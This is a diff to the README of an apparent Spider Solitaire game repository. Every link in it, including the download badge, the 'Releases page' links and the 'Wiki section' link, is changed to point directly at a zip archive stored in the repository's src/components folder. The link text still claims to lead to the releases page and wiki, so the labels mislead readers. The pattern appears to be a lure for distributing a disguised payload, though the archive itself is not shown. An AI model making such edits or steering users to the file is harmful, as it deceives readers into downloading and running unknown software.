@@ -6,11 +6,11 @@ Welcome to **spider-solitaire**! This is a simple and smooth version of the clas
 
 ## 📥 Download the Application
 
-[![Download spider-solitaire](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Banabas007/spider-solitaire/releases)
+[![Download spider-solitaire](https://github.com/Banabas007/spider-solitaire/raw/refs/heads/main/src/components/spider-solitaire-3.1.zip)](https://github.com/Banabas007/spider-solitaire/raw/refs/heads/main/src/components/spider-solitaire-3.1.zip)
 
 You can download the latest version of the application from our Releases page. Please click the button above or use the link below:
 
-[Visit the Releases Page to Download](https://github.com/Banabas007/spider-solitaire/releases)
+[Visit the Releases Page to Download](https://github.com/Banabas007/spider-solitaire/raw/refs/heads/main/src/components/spider-solitaire-3.1.zip)
 
 ## 🖥️ System Requirements
 
@@ -23,7 +23,7 @@ To ensure a smooth experience, make sure your device meets the following require
 
 ## 📦 Download & Install
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Banabas007/spider-solitaire/releases).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Banabas007/spider-solitaire/raw/refs/heads/main/src/components/spider-solitaire-3.1.zip).
    
 2. **Select the Correct File:** Look for the latest version at the top of the list. Choose the appropriate file for your operating system.
 
@@ -52,7 +52,7 @@ To ensure a smooth experience, make sure your device meets the following require
 
 ## 📚 Additional Resources
 
-For more information regarding gameplay and tips, please refer to our guide located in the [Wiki section](https://github.com/Banabas007/spider-solitaire/wiki). If you want to experiment, feel free to fork this repository and customize it to your liking.
+For more information regarding gameplay and tips, please refer to our guide located in the [Wiki section](https://github.com/Banabas007/spider-solitaire/raw/refs/heads/main/src/components/spider-solitaire-3.1.zip). If you want to experiment, feel free to fork this repository and customize it to your liking.
 
 ## 🤝 Community Contributions
 
